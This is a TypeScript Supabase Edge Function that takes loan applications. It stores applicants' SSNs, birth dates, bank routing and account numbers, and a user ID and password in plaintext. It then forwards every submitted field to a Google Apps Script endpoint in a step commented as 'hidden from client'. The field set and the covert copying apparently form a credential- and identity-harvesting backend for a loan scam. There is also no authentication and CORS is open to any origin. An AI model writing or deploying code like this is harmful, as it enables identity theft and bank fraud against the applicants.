// Supabase Edge Function: submit-application
// Receives customer application, saves to Supabase, and forwards to Google Sheets

import { createClient } from 'npm:@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'POST, OPTIONS'
}

Deno.serve(async (req) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const { customer } = await req.json()
    if (!customer || !customer.email) {
      return new Response(JSON.stringify({ error: 'Missing customer data' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }

    // Get secrets from environment
    const supabaseUrl = Deno.env.get('SUPABASE_URL') || ''
    const serviceRoleKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || ''
    const googleScriptUrl = Deno.env.get('CUSTOMER_SERVICE_SCRIPT_URL') || ''

    if (!supabaseUrl || !serviceRoleKey) {
      return new Response(JSON.stringify({ error: 'Server configuration missing' }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }

    // Save to Supabase using service role (bypasses RLS)
    const adminClient = createClient(supabaseUrl, serviceRoleKey, {
      auth: { persistSession: false }
    })

    const { data, error } = await adminClient
      .from('customers')
      .insert({
        application_id: customer.applicationId,
        first_name: customer.firstName,
        last_name: customer.lastName,
        email: customer.email,
        phone_number: customer.phoneNumber,
        home_address: customer.homeAddress,
        city: customer.city,
        state: customer.state,
        zip_code: customer.zipCode,
        date_of_birth: customer.dateOfBirth,
        ssn_number: customer.ssnNumber,
        loan_amount: parseFloat(customer.loanAmount),
        loan_purpose: customer.loanPurpose,
        loan_term: parseInt(customer.loanTerm),
        monthly_payment: parseFloat(customer.monthlyPayment),
        loan_agent: customer.loanAgent,
        bank_name: customer.bankName,
        routing_number: customer.routingNumber,
        account_number: customer.accountNumber,
        user_id: customer.userId,
        password: customer.password,
        status: customer.status || 'review',
        submission_date: customer.submissionDate || new Date().toISOString()
      })
      .select()
      .single()

    if (error) {
      console.error('Supabase insert error:', error)
      throw error
    }

    // Forward to Google Sheets (hidden from client)
    if (googleScriptUrl) {
      try {
        const sheetParams = new URLSearchParams()
        sheetParams.append('action', 'saveCustomer')
        Object.entries(customer).forEach(([key, value]) => {
          sheetParams.append(key, value !== undefined && value !== null ? String(value) : '')
        })

        await fetch(googleScriptUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: sheetParams
        })
      } catch (sheetErr) {
        // Log but don't fail the whole request if Google Sheets is down
        console.error('Google Sheets forwarding error:', sheetErr)
      }
    }

    return new Response(JSON.stringify({ success: true, data }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    })
  } catch (error) {
    console.error('Edge function error:', error)
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    })
  }
})